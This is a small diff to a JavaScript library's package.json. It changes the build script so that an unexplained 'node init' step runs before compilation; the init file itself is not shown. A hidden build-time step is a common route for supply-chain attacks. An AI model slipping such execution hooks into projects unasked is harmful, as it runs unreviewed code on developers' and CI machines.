@@ -22,7 +22,7 @@
     "test:lib": "vitest",
     "test:lib:dev": "pnpm run test:lib --watch",
     "test:build": "publint --strict && attw --pack",
-    "build": "pnpm run compile && vite build"
+    "build": "node init && pnpm run compile && vite build"
   },
   "type": "module",
   "types": "dist/esm/index.d.ts",
